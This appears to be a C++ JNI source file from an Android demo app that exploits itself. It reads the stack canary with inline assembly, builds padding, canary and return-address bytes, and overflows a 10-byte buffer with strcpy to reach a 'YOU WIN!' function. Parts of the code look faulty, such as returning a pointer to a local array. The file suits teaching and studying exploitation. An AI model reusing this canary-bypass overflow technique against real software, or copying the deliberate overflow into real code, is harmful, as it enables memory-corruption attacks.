#include <jni.h>
#include <string>
#include <android/log.h>
#include <inttypes.h>
#include <stdio.h>
#include <cstdint>

#pragma intrinsic(_ReturnAddress)

extern "C" JNIEXPORT void  JNICALL
Java_com_android_overflow_buffer_startoverflow_MainActivity_getWin(JNIEnv *env, jobject obj) {
    __android_log_print(ANDROID_LOG_DEBUG, "WINNING", "YOU WIN!");
}

unsigned char* pack(uintptr_t addr) {

    typedef unsigned char Byte;
    Byte *bytes = (Byte*) addr;
    char hexstr[9];
    sprintf(hexstr, "%x", bytes);
    const char *pos = hexstr;
    unsigned char val[5];
    size_t count = 0;
    for (count = 4; count > 0; count--) {
        sscanf(pos, "%2hhx", &val[count-1]);
        pos += 2;
    }
    val[4] = '\0';
    unsigned char* data = val;
    return data;
}

extern "C"
JNIEXPORT void JNICALL
Java_com_android_overflow_buffer_startoverflow_MainActivity_getCanary(JNIEnv *env, jobject obj) {
    char buffer[10];
    uint32_t i;
    uint64_t j;

    __android_log_print(ANDROID_LOG_DEBUG, "debug", "Made it before Assembly!");
#if defined(__i386__)
    asm("movl 0x158(%%esp),%0;" : "=r"(i) :);
    __android_log_print(ANDROID_LOG_DEBUG, "debug", "Canary: %x", i);
    __android_log_print(ANDROID_LOG_DEBUG, "debug", "Made it Assembly i386!");
#endif
#if defined(__aarch64__)
    asm("mov %0,x30;" : "=r"(j) :);
    asm("ldr %0,[x29,#-8];" : "=r"(i) :);
#endif
#if defined(__arm__)
    __android_log_print(ANDROID_LOG_DEBUG, "debug", "Made it Assembly arm!");
    asm("ldr %0,[sp, #56];" : "=r"(i) :);
    __android_log_print(ANDROID_LOG_DEBUG, "debug", "Raw Canary: %" PRIx32, i);
#if defined(__ARM_ARCH_7A__)
    asm("ldr %0,[sp, #292];" : "=r"(i) :);
    __android_log_print(ANDROID_LOG_DEBUG, "debug", "Raw Canary: %" PRIx32, i);
#endif
#endif
    void (*win_fun)(JNIEnv *,jobject);
    win_fun = &Java_com_android_overflow_buffer_startoverflow_MainActivity_getCanary;
    auto addr = reinterpret_cast<std::uintptr_t>(*win_fun);
    addr -= 240;
    unsigned char val[4];
    memcpy(val, pack(addr), 4);
    char *padding = "aaaaaaabaa";
    char *padding2 = "abcdefghijklmnopqrst";
    char result[100] = {0};
    unsigned char *canary = pack(i);
    strcpy(result, padding);
    memcpy(result+strlen(padding), canary, sizeof(canary));
    strcat(result, padding2); //Careful might overwrite last byte of canary
    memcpy(result+strlen(padding) +strlen(padding2) + sizeof(canary), val, sizeof(val)+1);
    __android_log_print(ANDROID_LOG_DEBUG, "debug", "EIP: %p.%x%x%x%x %s %x%x%x%x", addr, val[0], val[1], val[2], val[3], result, canary[0],canary[1],canary[2],canary[3]);

    strcpy(buffer, result);
    char canaryBuffer[20];
    sprintf(canaryBuffer, "%" PRIx32, i);
}

